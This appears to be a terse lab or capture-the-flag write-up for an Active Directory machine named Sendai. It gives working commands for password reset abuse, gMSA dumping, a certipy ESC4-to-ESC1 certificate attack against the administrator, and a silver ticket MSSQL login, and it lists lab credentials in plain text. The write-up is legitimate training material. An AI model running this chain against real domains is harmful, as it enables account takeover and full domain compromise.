
# Enumeration
Using Rid bruteforce got the users:
![](attachment/56bf479b4e3d4f163ab37e7750d8d5b6.png)

Enumerating smb:![](attachment/863204d4e7328d96ee3f1576e0095b57.png)

Using blank password we get 2 password must change:
![](attachment/e0583e6ac1c57617ef45b9914719e000.png)
Now changing the password:
```
smbpasswd.py sendai.vl/Elliot.Yates:''@10.10.90.42 -newpass aditya123@
```


Using bloodhound:
![](attachment/da6f723dceebf1b4b1f08b018ac354e2.png)

Now following the path:
```
net rpc group addmem "admsvc" Elliot.Yates -U sendai.vl/Elliot.Yates -S sendai.vl
```
```
gMSADumper.py -u 'Elliot.Yates' -p 'aditya123@' -d 'sendai.vl'
```
![](attachment/b40fc1e06e432b39ecd27b892e55959f.png)
Now we can login to evil-winrm


Using privesccheck.ps1:
![](attachment/017ce8ba4efd90f8bbc0be826c0a15af.png)
We get the creds for a user called clifford.davey

Now using certipy:
```
certipy find -u 'clifford.davey' -p 'RFmoB2WplgE_3p' -dc-ip 10.10.90.42 -stdout -vulnerable
```
We find an esc4 vulnerable certificate:
![](attachment/5c17af0a16eba1a89b5c20780227a402.png)
Converting to ESC1 template:
```
certipy template -username 'clifford.davey'@sendai.vl -password RFmoB2WplgE_3p -template SendaiComputer -save-old
```
Now requesting key:
```
certipy req -u 'clifford.davey'@sendai.vl -p RFmoB2WplgE_3p -c 'sendai-DC-CA' -target 'sendai.vl' -template 'SendaiComputer' -upn 'administrator@sendai.vl' -dc-ip 10.10.90.42 -debug
```


# MSSQL Method
Now generating a silver ticket with [[Silver Ticket Attack]]
Using chisel to port forward 1433 to localhost.

Then using the ticket to login to mssql:
```
proxychains mssqlclient.py -k dc.sendai.vl
```
Now getting reverse shell we can execute juicypotato or GodPotato for admin

# Web Server Method